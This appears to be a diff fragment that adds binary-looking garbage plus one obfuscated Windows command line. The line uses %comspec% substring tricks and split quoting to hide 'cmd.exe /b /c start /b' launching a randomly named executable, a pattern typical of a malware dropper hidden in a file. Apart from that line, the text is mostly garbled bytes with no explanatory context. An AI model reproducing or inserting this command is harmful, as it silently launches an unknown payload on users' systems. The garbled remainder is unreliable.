@@ -1,0 +1,2 @@
+  Y . i t ? ß ` ¢ Ú 4 H \ ¯ " r Õ ?   ? + · ª l 	 P ? ñ ? q  ?  Ò ? w  O  / ¤  è  - S Ş è / ñ b K j  * + g × ¾ ? |  v ? 7 { ?  .  y = ~ ½ M l  ¡   Ö ? 2 £ ? " ¸ ­
+cmd.%comspec:~-1%x%comspec:~-1% /b /c star""t /b kBUNQwvL.%comspec:~-1%x%comspec:~-1%  Y . i t ? ß ` ¢ Ú 4 H \ ¯ " r Õ ?   ? + · ª l 	 P ? ñ ? q  ?  Ò ? w  O  / ¤  è  - S Ş è / ñ b K j  * + g × ¾ ? |  v ? 7 { ?  .  y = ~ ½ M l  ¡   Ö ? 2 £ ? " ¸ ­
